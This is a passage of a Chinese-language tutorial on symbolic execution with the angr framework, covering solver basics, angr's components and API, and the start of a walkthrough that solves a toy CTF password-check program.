# 符号执行与angr实战

> 本文档从符号执行基础理论出发，结合 angr 框架进行实战演练，涵盖从入门到高级技巧的完整知识体系。所有代码示例均可运行，案例均来自真实 CTF 题目和漏洞挖掘场景。

---

## 目录

1. [符号执行基础](#1-符号执行基础)
2. [angr入门](#2-angr入门)
3. [angr核心功能](#3-angr核心功能)
4. [CTF逆向解题实战](#4-ctf逆向解题实战)
5. [漏洞挖掘与利用](#5-漏洞挖掘与利用)
6. [高级技巧与优化](#6-高级技巧与优化)
7. [angr插件与生态](#7-angr插件与生态)
8. [常见问题与解决方案](#8-常见问题与解决方案)

---

## 1. 符号执行基础

### 1.1 什么是符号执行

符号执行（Symbolic Execution）是一种程序分析技术，其核心思想是使用**符号值**代替具体值作为程序输入，通过模拟程序执行来收集路径约束，最终通过约束求解器（SMT Solver）求解出满足特定路径条件的具体输入值。

**Concolic Execution**（混合符号执行）是符号执行的一种变体，它将具体执行（Concrete Execution）与符号执行（Symbolic Execution）相结合，在实际运行程序的同时维护符号状态，从而兼顾分析的准确性与效率。

#### 符号执行 vs 传统测试

| 特性 | 传统测试 | 符号执行 |
|------|---------|---------|
| 输入 | 具体值 | 符号变量 |
| 路径覆盖 | 依赖人工设计用例 | 自动探索所有可达路径 |
| 约束求解 | 无 | 使用 SMT 求解器 |
| 适用场景 | 功能验证 | 漏洞发现、逆向分析 |

#### 一个简单的例子

考虑以下 C 代码：

```c
int check_password(char *input) {
    if (input[0] == 'A') {
        if (input[1] == 'B') {
            if (input[2] == 'C') {
                printf("Password correct!\n");
                return 1;
            }
        }
    }
    printf("Wrong password!\n");
    return 0;
}
```

使用符号执行分析：
1. 将 `input` 标记为符号变量（例如 `x0, x1, x2`）
2. 程序执行到第一个 `if` 时，产生两条路径：
   - 路径1：`x0 == 'A'`（进入分支）
   - 路径2：`x0 != 'A'`（跳过分支）
3. 继续探索路径1，第二个 `if` 又产生两条路径
4. 最终到达 `Password correct!` 的路径约束为：`x0 == 'A' && x1 == 'B' && x2 == 'C'`
5. 约束求解器求解得到：`input = "ABC"`

### 1.2 符号执行原理

#### 1.2.1 符号变量（Symbolic Variable）

符号变量是符号执行的基础。与具体值不同，符号变量代表一个未知的、可以取任意值的输入。符号变量可以表示：
- 用户输入（stdin、命令行参数、文件输入）
- 网络数据
- 内存中的未知区域
- 寄存器的未知值

在约束系统中，符号变量被表示为逻辑变量，其取值范围由数据类型决定。

#### 1.2.2 约束求解（Constraint Solving）

约束求解是符号执行的核心环节。当程序执行到条件分支时，符号执行引擎会为每个分支生成相应的**路径约束**（Path Constraint），并将其添加到约束集合中。

**SMT（Satisfiability Modulo Theories）求解器**用于判断一组约束是否可满足，并给出满足约束的解。常用的 SMT 求解器包括：

- **Z3**：微软研究院开发，功能强大，支持多种理论
- **Yices**：SRI 开发，性能优秀
- **STP**：专注于位向量和数组理论
- **Boolector**：针对位向量优化

约束求解过程示例：

```python
# 伪代码：约束求解过程
constraints = [
    x0 == 0x41,  # 'A'
    x1 == 0x42,  # 'B'
    x2 == 0x43   # 'C'
]

solver = SMTolver()
solver.add(constraints)

if solver.satisfiable():
    solution = solver.get_solution()
    # solution: {x0: 0x41, x1: 0x42, x2: 0x43}
```

#### 1.2.3 路径探索（Path Exploration）

符号执行需要系统地探索程序的所有可能路径。路径探索策略直接影响符号执行的效率和效果。

**常见的路径探索策略：**

1. **深度优先搜索（DFS）**：沿一条路径深入到底，再回溯探索其他路径
2. **广度优先搜索（BFS）**：按层级逐层探索
3. **随机搜索**：随机选择路径进行探索
4. **覆盖率引导搜索**：优先探索能覆盖新代码的路径（类似 AFL 的策略）

**路径爆炸问题**是符号执行面临的主要挑战：程序中的分支数量呈指数级增长，导致路径数量爆炸式增长。例如，一个包含 30 个条件分支的程序，理论上就有 2^30 ≈ 10 亿条路径。

### 1.3 符号执行的应用场景

#### 1.3.1 漏洞发现

符号执行可以自动生成能够触发漏洞的输入：

- **缓冲区溢出**：符号化输入数据，探索能否越过缓冲区边界
- **格式化字符串漏洞**：检测用户输入能否控制格式化字符串
- **整数溢出**：通过约束求解发现可能导致溢出的输入
- **Use-After-Free**：跟踪内存状态，检测释放后使用的情况

#### 1.3.2 逆向分析

在逆向工程中，符号执行可以帮助：

- **自动求解验证码/密码**：对验证逻辑进行符号执行，直接求解正确输入
- **解密算法逆向**：将加密算法的输出作为约束，求解原始输入
- **混淆代码分析**：通过符号执行穿透混淆逻辑
- **协议逆向**：分析未知协议的格式和校验逻辑

#### 1.3.3 测试用例生成

符号执行可以自动生成高覆盖率的测试用例：

- 自动探索所有可达路径
- 为每条路径生成对应的测试输入
- 确保代码覆盖率最大化
- 辅助模糊测试（Fuzzing）的种子生成

### 1.4 常用符号执行引擎介绍

#### 1.4.1 angr

- **开发语言**：Python（核心为 C/C++）
- **特点**：功能全面、易于扩展、社区活跃
- **适用场景**：CTF 解题、漏洞挖掘、二进制分析
- **官网**：https://angr.io/

angr 是一个开源的二进制分析框架，集成了符号执行、静态分析、动态分析等多种功能。它基于 VEX 中间表示，可以分析多种架构的二进制程序（x86、x86_64、ARM、MIPS 等）。

#### 1.4.2 KLEE

- **开发语言**：C++
- **特点**：基于 LLVM IR、性能优秀
- **适用场景**：源代码级符号执行、单元测试生成
- **官网**：https://klee.github.io/

KLEE 是基于 LLVM 的符号执行引擎，直接在 LLVM IR 层面进行符号执行。它需要源代码支持，主要用于测试用例自动生成和漏洞发现。

#### 1.4.3 S2E

- **开发语言**：C++
- **特点**：基于 QEMU 全系统仿真、支持内核级分析
- **适用场景**：全系统符号执行、驱动程序分析
- **官网**：https://s2e.systems/

S2E（Selective Symbolic Execution）是一个全系统符号执行平台，基于 QEMU 实现，可以对操作系统内核和驱动程序进行符号执行分析。

#### 1.4.4 Triton

- **开发语言**：C++（Python 绑定）
- **特点**：轻量级、基于 DBI（动态二进制插桩）
- **适用场景**：漏洞利用辅助、逆向分析
- **官网**：https://triton.quarkslab.com/

Triton 是 Quarkslab 开发的动态符号执行框架，基于 Pin 或 DBI 框架实现，主要用于漏洞利用开发和逆向分析。

---

## 2. angr入门

### 2.1 angr安装与环境配置

#### 2.1.1 安装方式

**方式一：pip 安装（推荐）**

```bash
# 创建虚拟环境
python -m venv angr-env
source angr-env/bin/activate  # Linux/Mac
# 或 Windows: angr-env\Scripts\activate

# 安装 angr
pip install angr
```

**方式二：使用 angr 官方 Docker 镜像**

```bash
docker pull angr/angr
docker run -it --rm -v $PWD:/home/angr/work angr/angr
```

**方式三：源码安装**

```bash
git clone https://github.com/angr/angr.git
cd angr
pip install -e .
```

#### 2.1.2 验证安装

```python
import angr

print(f"angr version: {angr.__version__}")
# 输出示例: angr version: 9.2.x
```

#### 2.1.3 依赖组件

angr 的安装会自动安装以下核心依赖：

- **claripy**：约束求解抽象层
- **cle**：二进制加载器
- **pyvex**：VEX IR 的 Python 绑定
- **archinfo**：架构信息库
- **z3-solver**：Z3 约束求解器
- **unicorn**：CPU 仿真引擎

### 2.2 angr基本架构

angr 采用模块化设计，主要由以下几个核心组件组成：

```
┌─────────────────────────────────────────────────┐
│                    angr                         │
├──────────┬──────────┬───────────┬───────────────┤
│   CLE    │   VEX    │ SimuVEX   │   Claripy     │
│ (加载器) │ (中间表示)│ (模拟执行) │ (约束求解)    │
└──────────┴──────────┴───────────┴───────────────┘
```

#### 2.2.1 CLE（CLE Loads Everything）

CLE 是 angr 的二进制加载器，负责加载和解析二进制文件及其依赖的共享库。

- 支持 ELF、PE、Mach-O 等多种格式
- 自动加载依赖的共享库
- 处理重定位和符号解析
- 支持加载自定义固件和裸机二进制

```python
import cle

# 加载二进制文件
ld = cle.Loader("./binary")
print(f"Entry point: {hex(ld.main_object.entry)}")
print(f"Loaded objects: {list(ld.all_objects.keys())}")
```

#### 2.2.2 VEX（Valgrind Intermediate Representation）

VEX 是 Valgrind 项目开发的中间表示（IR），angr 使用 VEX 将不同架构的机器码转换为统一的中间表示。

- 支持 x86、x86_64、ARM、MIPS、PPC 等架构
- 将机器指令转换为统一的 VEX IR
- 便于进行架构无关的分析

```python
import pyvex
import archinfo

# 将机器码转换为 VEX IR
arch = archinfo.ArchAMD64()
irsb = pyvex.lift(b"\x48\x89\xc3", 0x400000, arch)  # mov rbx, rax
print(irsb.pp())
```

#### 2.2.3 SimuVEX（Simulation VEX）

SimuVEX 是 angr 的模拟执行引擎，负责解释执行 VEX IR 并维护符号状态。

- 执行 VEX IR 指令
- 维护符号内存和寄存器状态
- 处理条件分支，生成路径约束
- 管理状态的复制和合并

#### 2.2.4 Claripy

Claripy 是 angr 的约束求解抽象层，封装了底层的 SMT 求解器。

- 提供统一的符号表达式接口
- 支持多种后端求解器（Z3、Z3 字符串求解器等）
- 管理符号变量和约束集合
- 执行约束求解和模型生成

### 2.3 第一个angr脚本：加载二进制文件

让我们从最简单的例子开始，学习如何使用 angr 加载一个二进制文件。

#### 2.3.1 准备测试程序

首先，我们创建一个简单的 C 程序作为测试目标：

```c
// simple.c - 编译: gcc -o simple simple.c -no-pie
#include <stdio.h>
#include <string.h>

int check_password(const char *password) {
    if (strlen(password) != 5)
        return 0;
    if (password[0] == 'a' &&
        password[1] == 'n' &&
        password[2] == 'g' &&
        password[3] == 'r' &&
        password[4] == '!')
        return 1;
    return 0;
}

int main() {
    char buffer[32];
    printf("Enter password: ");
    scanf("%s", buffer);
    if (check_password(buffer))
        printf("Correct!\n");
    else
        printf("Wrong!\n");
    return 0;
}
```

#### 2.3.2 加载二进制文件

```python
import angr
import sys

# 1. 创建 Project 对象，加载二进制文件
proj = angr.Project("./simple", auto_load_libs=False)

# 2. 查看基本信息
print(f"文件路径: {proj.filename}")
print(f"架构: {proj.arch.name}")
print(f"入口点: {hex(proj.entry)}")
print(f"是否为 PIC: {proj.loader.main_object.pic}")
print(f"基地址: {hex(proj.loader.main_object.mapped_base)}")

# 3. 获取符号地址
check_password_addr = proj.loader.find_symbol("check_password").rebased_addr
print(f"check_password 地址: {hex(check_password_addr)}")

# 4. 查看所有加载的对象
for obj in proj.loader.all_objects:
    print(f"  {obj.binary_basename}: {hex(obj.mapped_base)} - {hex(obj.max_addr)}")
```

**输出示例：**

```
文件路径: ./simple
架构: AMD64
入口点: 0x401040
是否为 PIC: False
基地址: 0x400000
check_password 地址: 0x401132
```

### 2.4 基本概念

#### 2.4.1 Project（项目）

`Project` 是 angr 的核心入口点，代表一个被分析的二进制程序。

```python
# 创建 Project 的常用参数
proj = angr.Project(
    "./binary",
    auto_load_libs=False,     # 不自动加载共享库（加快速度）
    main_opts={
        'base_addr': 0x400000,  # 手动指定基地址
        'arch': 'amd64',        # 指定架构
    },
    lib_opts={
        'libc.so.6': {'base_addr': 0x7f0000000000}
    }
)
```

#### 2.4.2 SimState（模拟状态）

`SimState` 表示程序在某一时刻的完整状态，包括：

- **寄存器状态**：所有寄存器的值（可以是具体值或符号值）
- **内存状态**：整个内存空间的内容
- **约束集合**：当前路径的所有约束条件
- **文件系统状态**：标准输入输出、文件等

```python
# 创建初始状态
state = proj.factory.entry_state()

# 查看寄存器
print(f"rax = {state.regs.rax}")
print(f"rip = {state.regs.rip}")
print(f"rsp = {state.regs.rsp}")

# 查看内存
print(f"入口点的指令: {state.mem[proj.entry].int.concrete:#x}")

# 添加约束
state.add_constraints(state.regs.rax == 0x1234)
```

#### 2.4.3 Simulation Manager（模拟管理器）

`SimulationManager` 负责管理多个状态的探索过程，是 angr 路径探索的核心。

```python
# 创建 Simulation Manager
simgr = proj.factory.simulation_manager(state)

# 执行到指定地址
simgr.explore(find=0x401150)

# 查看结果
if simgr.found:
    found_state = simgr.found[0]
    print(f"找到目标状态: {found_state}")
else:
    print("未找到目标状态")

# 查看当前活跃状态
print(f"活跃状态数: {len(simgr.active)}")
print(f"已避免的状态数: {len(simgr.avoid)}")
```

#### 2.4.4 完整示例：求解简单密码

```python
import angr
import claripy

def solve_simple_password():
    # 加载二进制
    proj = angr.Project("./simple", auto_load_libs=False)
    
    # 创建符号输入（32字节的符号数据）
    password = claripy.BVS("password", 8 * 32)  # 32 bytes = 256 bits
    
    # 创建初始状态，将符号输入放入 stdin
    state = proj.factory.entry_state(stdin=password)
    
    # 创建 Simulation Manager
    simgr = proj.factory.simulation_manager(state)
    
    # 定义目标地址和避免地址
    # 假设 0x401180 是打印 "Correct!" 的地址
    # 假设 0x401190 是打印 "Wrong!" 的地址
    find_addr = 0x401180
    avoid_addr = 0x401190
    
    # 开始探索
    simgr.explore(find=find_addr, avoid=avoid_addr)
    
    # 处理结果
    if simgr.found:
        found_state = simgr.found[0]
        # 求解符号输入
        solution = found_state.solver.eval(password, cast_to=bytes)
        # 去除空字符和换行
        solution = solution.split(b'\x00')[0].split(b'\n')[0]
        print(f"找到密码: {solution}")
        return solution
    else:
        print("未找到解决方案")
        return None

if __name__ == "__main__":
    solve_simple_password()
```

**运行结果：**

```
找到密码: b'angr!'
```

这个简单的例子展示了 angr 的基本工作流程：
1. 加载二进制文件（`Project`）
2. 创建符号变量（`claripy.BVS`）
3. 创建初始状态（`entry_state`）
4. 创建模拟管理器（`simulation_manager`）
5. 探索目标路径（`explore`）
6. 求解约束（`solver.eval`）

在下一章中，我们将深入学习 angr 的核心功能和高级用法。

---

## 3. angr核心功能

### 3.1 符号变量创建与约束添加（claripy使用）

Claripy 是 angr 的符号计算后端，负责管理符号变量、约束条件和约束求解。

#### 3.1.1 创建符号变量

```python
import claripy

# 创建位向量符号变量（最常用）
# BVS(name, size_bits)
x = claripy.BVS("x", 32)  # 32位符号整数
y = claripy.BVS("y", 8)   # 8位符号字节
password = claripy.BVS("password", 8 * 16)  # 16字节的符号字符串

# 创建浮点符号变量
f = claripy.FPS("f", claripy.FSORT_FLOAT)   # 32位浮点数
d = claripy.FPS("d", claripy.FSORT_DOUBLE)  # 64位浮点数

# 创建布尔符号变量
b = claripy.BoolS("b")

# 具体值转换为符号表达式
concrete = claripy.BVV(0x41, 8)   # 8位具体值 0x41
thirty_two = claripy.BVV(32, 32)  # 32位具体值 32
```

#### 3.1.2 符号表达式运算

```python
x = claripy.BVS("x", 32)
y = claripy.BVS("y", 32)

# 算术运算
add_expr = x + y
sub_expr = x - y
mul_expr = x * y
div_expr = x / y
mod_expr = x % y

# 位运算
and_expr = x & y
or_expr = x | y
xor_expr = x ^ y
not_expr = ~x
shl_expr = x << 3
shr_expr = x >> 2

# 比较运算（返回布尔表达式）
eq_expr = x == y
ne_expr = x != y
gt_expr = x > y
ge_expr = x >= y
lt_expr = x < y
le_expr = x <= y

# 条件表达式（类似三目运算符）
result = claripy.If(x > y, x, y)  # 如果 x>y 则取 x，否则取 y
```

#### 3.1.3 约束求解器使用

```python
x = claripy.BVS("x", 32)
y = claripy.BVS("y", 32)

# 创建求解器
solver = claripy.Solver()

# 添加约束
solver.add(x + y == 100)
solver.add(x > 30)
solver.add(y < 50)

# 检查约束是否可满足
if solver.satisfiable():
    print("约束可满足！")
    
    # 求解单个变量的值
    x_val = solver.eval(x, 1)[0]  # 求 x 的一个解
    y_val = solver.eval(y, 1)[0]  # 求 y 的一个解
    print(f"x = {x_val}, y = {y_val}")
    print(f"验证: x + y = {x_val + y_val}")
    
    # 求多个解
    x_vals = solver.eval(x, 5)  # 求 x 的5个不同解
    print(f"x 的5个可能值: {x_vals}")
    
    # 求最大/最小值
    x_max = solver.max(x)
    x_min = solver.min(x)
    print(f"x 的范围: [{x_min}, {x_max}]")
else:
    print("约束不可满足！")
```

#### 3.1.4 在 angr 状态中使用符号变量

```python
import angr
import claripy

proj = angr.Project("./binary", auto_load_libs=False)
state = proj.factory.entry_state()

# 将符号变量存入寄存器
x = claripy.BVS("x", 32)
state.regs.eax = x

# 将符号变量存入内存
password = claripy.BVS("password", 8 * 16)
state.memory.store(0x8048000, password)

# 添加约束
state.add_constraints(x > 100)
state.add_constraints(x < 200)

# 检查约束是否可满足
print(state.solver.satisfiable())

# 求解
x_val = state.solver.eval(x)
print(f"x = {x_val}")
```

### 3.2 状态探索策略

Simulation Manager 提供了多种探索策略，适用于不同的场景。

#### 3.2.1 Explorer 策略（默认）

Explorer 是最常用的探索策略，通过指定 `find` 和 `avoid` 地址来寻找目标路径。

```python
simgr = proj.factory.simulation_manager(state)

# 基本用法：探索到 find 地址，避开 avoid 地址
simgr.explore(
    find=0x401180,        # 目标地址（可以是列表）
    avoid=0x401190,       # 避免地址（可以是列表）
    num_find=1,           # 找到几个解就停止
    max_active_states=200, # 最大活跃状态数
    max_deadended=2000,   # 最大死路状态数
)

# 多个 find/avoid 地址
simgr.explore(
    find=[0x401180, 0x401200],
    avoid=[0x401190, 0x4011a0],
)

# 自定义 find 函数
def is_success(state):
    # 检查状态是否满足条件
    stdout = state.posix.dumps(1)  # 读取 stdout
    return b"Correct!" in stdout

simgr.explore(find=is_success)
```

#### 3.2.2 DFS 策略（深度优先）

```python
simgr = proj.factory.simulation_manager(state)
simgr.use_technique(angr.exploration_techniques.DFS())

# 使用 DFS 方式运行
simgr.run(n=1000)  # 执行1000步
```

#### 3.2.3 BFS 策略（广度优先）

```python
simgr = proj.factory.simulation_manager(state)
simgr.use_technique(angr.exploration_techniques.BFS())
simgr.run(n=1000)
```

#### 3.2.4 LoopSeer（循环处理）

LoopSeer 用于检测和处理循环，避免路径爆炸。

```python
from angr.exploration_techniques import LoopSeer

simgr = proj.factory.simulation_manager(state)
loop_seer = LoopSeer(
    loop_project=proj,
    use_header=False,
    limit=10,  # 每个循环最多迭代次数
)
simgr.use_technique(loop_seer)
simgr.run()
```

#### 3.2.5 LengthLimiter（长度限制）

限制执行路径的长度，防止无限循环。

```python
from angr.exploration_techniques import LengthLimiter

simgr = proj.factory.simulation_manager(state)
simgr.use_technique(LengthLimiter(max_length=5000))
simgr.run()
```

#### 3.2.6 Veritesting

Veritesting 是一种将静态分析与符号执行结合的技术，可以有效处理循环。

```python
from angr.exploration_techniques import Veritesting

simgr = proj.factory.simulation_manager(state)
simgr.use_technique(Veritesting(
    enable_veritesting=True,
    veritesting_max_states=100,
))
simgr.explore(find=target_addr)
```

### 3.3 地址与符号跳转控制

#### 3.3.1 手动设置执行地址

```python
# 从指定地址开始执行
state = proj.factory.blank_state(addr=0x401132)  # 从 check_password 开始

# 跳转到指定地址
state.ip = 0x401150  # 设置指令指针
```

#### 3.3.2 符号跳转（Unconstrained 状态）

当 angr 遇到无法确定目标地址的间接跳转时，会产生 unconstrained 状态。

```python
# 检测 unconstrained 状态
simgr.stash(to_stash='unconstrained', filter_func=lambda s: s.ip.symbolic)

# 处理 unconstrained 状态
for state in simgr.unconstrained:
    print(f"符号跳转: {state.regs.ip}")
```

#### 3.3.3 手动控制分支

```python
# 在特定地址停止，手动处理分支
simgr.step(until=lambda lpg: any(s.addr == 0x401100 for s in lpg.active))

# 获取当前状态
state = simgr.active[0]

# 查看分支条件
successors = proj.factory.successors(state)
print(f"分支数量: {len(successors.successors)}")
for i, succ in enumerate(successors.successors):
    print(f"  分支 {i}: addr={hex(succ.addr)}, guard={succ.history.jump_guard}")
```

### 3.4 Hook函数与SimProcedure

Hook 允许我们替换或修改程序中的函数行为，是处理外部函数、加速执行的重要手段。

#### 3.4.1 基本 Hook 用法

```python
# Hook 单个地址
@proj.hook(0x401000, length=5)
def my_hook(state):
    # 自定义逻辑
    state.regs.eax = 0x1
    # length=5 表示跳过 5 字节的原始指令

# 也可以这样写
def my_hook_func(state):
    state.regs.eax = 0x1

proj.hook(0x401000, my_hook_func, length=5)
```

#### 3.4.2 SimProcedure

SimProcedure 是用 Python 编写的函数模拟，可以完全替换二进制中的函数。

```python
import angr
from angr import SimProcedure

# 自定义 atoi 函数
class my_atoi(SimProcedure):
    def run(self, str_addr):
        # 读取字符串
        s = self.state.memory.load(str_addr, 100)
        
        # 简化：假设输入是十进制数字
        # 实际实现需要逐字符解析
        result = claripy.BVS("atoi_result", 32)
        self.state.add_constraints(result >= 0)
        self.state.add_constraints(result <= 99999)
        
        return result

# 注册 SimProcedure
proj.hook_symbol("atoi", my_atoi())
```

#### 3.4.3 常用内置 SimProcedure

angr 已经为许多标准库函数提供了 SimProcedure：

```python
# 查看可用的 SimProcedure
# angr.SIM_PROCEDURES 包含所有内置的 SimProcedure
print(list(angr.SIM_PROCEDURES['libc'].keys()))
print(list(angr.SIM_PROCEDURES['posix'].keys()))

# 常用的有：
# - libc: printf, scanf, strlen, strcmp, strcpy, memcpy, malloc, free, atoi, ...
# - posix: read, write, open, close, mmap, ...
# - stubs: 返回 0 的存根函数
```

#### 3.4.4 Hook 所有未知函数

```python
# 将所有未解析的符号 hook 为返回 0 的存根
def hook_all_unknowns(proj):
    for obj in proj.loader.all_elf_objects:
        for reloc in obj.imports.values():
            if reloc.symbol and reloc.symbol.name not in proj._sim_procedures:
                print(f"Hooking {reloc.symbol.name} at {hex(reloc.rebased_addr)}")
                proj.hook(reloc.rebased_addr, angr.SIM_PROCEDURES['stubs']['ReturnUnconstrained']())
```

### 3.5 条件断点与状态检查

#### 3.5.1 条件断点

```python
from angr.exploration_techniques import ExplorationTechnique

class ConditionalBreakpoint(ExplorationTechnique):
    def __init__(self, check_func):
        super().__init__()
        self.check_func = check_func
        self.hit_states = []
    
    def step_state(self, simgr, state, **kwargs):
        # 每步执行前检查
        if self.check_func(state):
            self.hit_states.append(state.copy())
            print(f"命中断点: {hex(state.addr)}")
        return simgr.step_state(state, **kwargs)

# 使用示例：当 eax 为 0x1234 时中断
def check_eax(state):
    return state.solver.is_true(state.regs.eax == 0x1234)

simgr = proj.factory.simulation_manager(state)
bp = ConditionalBreakpoint(check_eax)
simgr.use_technique(bp)
simgr.run(n=1000)

print(f"命中断点 {len(bp.hit_states)} 次")
```

#### 3.5.2 检查状态的各种方式

```python
def inspect_state(state):
    # 检查寄存器
    print(f"rax = {state.regs.rax}")
    print(f"rax 是符号的吗？ {state.regs.rax.symbolic}")
    print(f"rax 的具体值: {state.solver.eval(state.regs.rax)}")
    
    # 检查内存
    mem_val = state.memory.load(0x402000, 4)
    print(f"内存 0x402000: {mem_val}")
    
    # 检查约束数量
    print(f"约束数量: {len(state.solver.constraints)}")
    
    # 检查栈指针
    print(f"rsp = {hex(state.solver.eval(state.regs.rsp))}")
    
    # 检查标准输入/输出
    stdin_content = state.posix.dumps(0)  # 0 = stdin
    stdout_content = state.posix.dumps(1)  # 1 = stdout
    print(f"stdin: {stdin_content}")
    print(f"stdout: {stdout_content}")
    
    # 检查当前执行的代码段
    print(f"当前地址: {hex(state.addr)}")
    
    # 检查历史
    print(f"历史地址数: {len(state.history.addrs)}")
```

### 3.6 内存与寄存器操作

#### 3.6.1 寄存器操作

```python
state = proj.factory.blank_state(addr=0x401000)

# 读/写寄存器
state.regs.eax = 0x1234
state.regs.ebx = claripy.BVS("ebx_val", 32)

# 不同架构的寄存器
# x86: eax, ebx, ecx, edx, esi, edi, ebp, esp, eip
# x64: rax, rbx, rcx, rdx, rsi, rdi, rbp, rsp, rip, r8-r15
# ARM: r0-r12, sp, lr, pc

# 访问部分寄存器
state.regs.ax  # eax 的低16位
state.regs.al  # eax 的低8位
state.regs.ah  # eax 的 8-15 位

# 获取所有寄存器名
all_regs = proj.arch.registers.keys()
print(f"所有寄存器: {list(all_regs)}")
```

#### 3.6.2 内存操作

```python
# 写入内存
state.memory.store(0x402000, claripy.BVV(0x41424344, 32))  # 写入具体值
state.memory.store(0x402004, claripy.BVS("sym_mem", 32))   # 写入符号值

# 读取内存
val = state.memory.load(0x402000, 4)  # 读取4字节
print(f"内存值: {val}")

# 使用 mem 接口（更便捷）
state.mem[0x402000].int = 42          # 写入 int
state.mem[0x402000].int               # 读取 int
state.mem[0x402000].long = 0x1234     # 写入 long
state.mem[0x402000].string = b"hello" # 写入字符串

# 字符串操作
# 以 0 结尾的字符串
state.memory.store(0x402000, b"hello\x00")
s = state.mem[0x402000].string.concrete
print(f"字符串: {s}")
```

#### 3.6.3 栈操作

```python
# 压栈
def push(state, value):
    state.regs.rsp -= 8  # x64 下每个栈项 8 字节
    state.memory.store(state.regs.rsp, value)

# 弹栈
def pop(state):
    value = state.memory.load(state.regs.rsp, 8)
    state.regs.rsp += 8
    return value

# 函数调用模拟
def call_function(state, func_addr, args=None):
    """模拟函数调用"""
    # 保存返回地址
    push(state, 0x401200)  # 返回地址
    # 设置参数（x64 calling convention: rdi, rsi, rdx, rcx, r8, r9）
    if args:
        if len(args) > 0:
            state.regs.rdi = args[0]
        if len(args) > 1:
            state.regs.rsi = args[1]
        if len(args) > 2:
            state.regs.rdx = args[2]
    # 跳转到函数
    state.ip = func_addr
```

#### 3.6.4 内存保护与权限

```python
# 检查内存权限
perms = proj.loader.main_object.segments
for seg in perms:
    print(f"段: {seg.name}, 权限: {seg.perms}, 地址: {hex(seg.vaddr)}")

# 在 state 中检查内存是否可读/可写
def is_readable(state, addr, size=1):
    try:
        state.memory.load(addr, size)
        return True
    except Exception:
        return False
```

### 3.7 State 的类型与创建

```python
# 1. entry_state：从程序入口点开始
state = proj.factory.entry_state(
    args=["./binary", "arg1", "arg2"],  # 命令行参数
    env={"HOME": "/home/user"},         # 环境变量
    stdin=claripy.BVS("stdin", 8 * 100),  # 标准输入
)

# 2. blank_state：从指定地址开始的空白状态
state = proj.factory.blank_state(addr=0x401132)

# 3. call_state：模拟函数调用
state = proj.factory.call_state(
    0x401132,  # 函数地址
    0x1234,    # 参数1
    0x5678,    # 参数2
    "hello",   # 参数3
)

# 4. full_init_state：完整初始化状态
state = proj.factory.full_init_state(
    args=["./binary"],
    add_options={angr.options.STRICT_PAGE_ACCESS},
)
```

### 3.8 选项配置（State Options）

angr 提供了大量选项来控制符号执行的行为。

```python
# 常用选项
common_options = {
    # 符号执行模式
    angr.options.SYMBOLIC,            # 启用符号执行（默认）
    angr.options.CGC_NO_SYMBOLIC_RECEIVE_LENGTH,
    
    # 内存选项
    angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,  # 未初始化内存为符号
    angr.options.ALL_FILES_EXIST,     # 假设所有文件都存在
    angr.options.STRICT_PAGE_ACCESS,  # 严格内存访问检查
    
    # 优化选项
    angr.options.OPTIMIZE_IR,         # 优化 IR
    angr.options.SIMPLIFY_MEMORY_WRITES,  # 简化内存写入
    angr.options.SIMPLIFY_EXIT_STATE,     # 简化退出状态
    angr.options.SIMPLIFY_EXIT_GUARD,     # 简化分支条件
    
    # 跟踪选项
    angr.options.TRACK_OPTIMIZATIONS,     # 跟踪优化
    angr.options.TRACK_CONSTRAINTS,       # 跟踪约束
    angr.options.TRACK_ACTION_HISTORY,    # 跟踪操作历史
    angr.options.TRACK_MEMORY_ACTIONS,    # 跟踪内存操作
    angr.options.TRACK_REGISTER_ACTIONS,  # 跟踪寄存器操作
    angr.options.TRACK_JMP_ACTIONS,       # 跟踪跳转操作
    
    # 浮点选项
    angr.options.FLOAT_REASON,        # 启用浮点推理
    angr.options.SUPPORT_FLOATING_POINT,  # 支持浮点（较慢）
    
    # 字符串选项
    angr.options.UNICORN,             # 使用 Unicorn 加速具体执行
}

# 使用示例
state = proj.factory.entry_state(
    add_options={angr.options.UNICORN},
    remove_options={angr.options.LAZY_SOLVES},
)
```

---

## 4. CTF逆向解题实战

CTF（Capture The Flag）比赛中的逆向题是符号执行最常见的应用场景。本章通过5个典型案例，展示如何使用 angr 解决各类逆向问题。

### 4.1 案例1：简单的验证程序（找到正确输入）

#### 4.1.1 题目描述

这是一道经典的入门级逆向题，程序要求用户输入一个密码，验证正确后输出 "Good Job!"。

```c
// crackme.c - 编译: gcc -o crackme crackme.c -no-pie -m32
#include <stdio.h>
#include <string.h>

int check(char *input) {
    if (strlen(input) != 8)
        return 0;
    if (input[0] != 'f' || input[1] != 'l' || input[2] != 'a' || input[3] != 'g')
        return 0;
    if (input[4] - input[5] != 3)
        return 0;
    if ((input[6] ^ 0x41) != input[7])
        return 0;
    if (input[4] + input[7] == 0x9a)
        return 0;
    return 1;
}

int main() {
    char buf[64];
    printf("Enter password: ");
    scanf("%s", buf);
    if (check(buf))
        printf("Good Job!\n");
    else
        printf("Try again.\n");
    return 0;
}
```

#### 4.1.2 解题思路

1. 使用 IDA/Ghidra 反编译，找到 `check` 函数和成功/失败的地址
2. 使用 angr 从 `check` 函数开始符号执行
3. 设置目标地址为成功分支，避开失败分支
4. 求解符号输入

#### 4.1.3 解题脚本

```python
import angr
import claripy

def solve_crackme():
    # 加载二进制文件
    proj = angr.Project("./crackme", auto_load_libs=False)
    
    # 创建 8 字节的符号输入
    input_len = 8
    input_data = claripy.BVS("input", 8 * input_len)
    
    # 从 check 函数开始执行
    # 假设 check 函数地址为 0x08049132
    check_addr = 0x08049132
    state = proj.factory.call_state(check_addr, input_data)
    
    # 创建 Simulation Manager
    simgr = proj.factory.simulation_manager(state)
    
    # 定义成功和失败的地址
    # 成功: printf("Good Job!") 之前的地址
    # 失败: printf("Try again.") 之前的地址
    success_addr = 0x08049190  # 返回 1 的地址
    fail_addr = 0x08049180     # 返回 0 的地址
    
    # 开始探索
    simgr.explore(find=success_addr, avoid=fail_addr)
    
    if simgr.found:
        found_state = simgr.found[0]
        # 求解输入
        solution = found_state.solver.eval(input_data, cast_to=bytes)
        print(f"找到密码: {solution.decode()}")
        return solution
    else:
        print("未找到解决方案")
        return None

if __name__ == "__main__":
    solve_crackme()
```

#### 4.1.4 另一种方法：从 main 开始

```python
def solve_crackme_from_main():
    proj = angr.Project("./crackme", auto_load_libs=False)
    
    # 创建符号输入，通过 stdin 传入
    input_data = claripy.BVS("input", 8 * 64)  # 64字节缓冲区
    
    state = proj.factory.entry_state(stdin=input_data)
    
    # 添加约束：输入长度为8，且都是可打印字符
    for i in range(8):
        byte = input_data.get_byte(i)
        state.add_constraints(byte >= 0x20)  # 可打印字符起始
